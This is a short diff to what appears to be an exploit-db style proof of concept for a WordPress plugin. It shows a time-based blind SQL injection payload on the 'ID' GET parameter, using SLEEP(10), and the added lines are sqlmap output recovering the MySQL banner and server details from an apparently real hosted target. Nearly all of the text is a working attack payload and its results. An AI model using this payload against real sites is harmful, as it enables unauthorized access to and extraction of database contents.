@@ -42,6 +42,15 @@ Parameter: ID (GET)
     Payload: ID=1 AND (SELECT 8471 FROM (SELECT(SLEEP(10)))PoaG)&page=wps_pages_page&type=1
 ---
 [04:49:24] [INFO] the back-end DBMS is MySQL
+[04:49:24] [INFO] fetching banner
+[04:49:24] [INFO] retrieved:
+[04:49:24] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
+5.7.33-36-lo
+[04:58:41] [ERROR] invalid character detected. retrying..
+g
+web application technology: WP Engine, Nginx
+back-end DBMS: MySQL >= 5.0.12 (Percona fork)
+banner: '5.7.33-36-log'
 ```
 # Reference:
 - https://www.exploit-db.com/exploits/49894
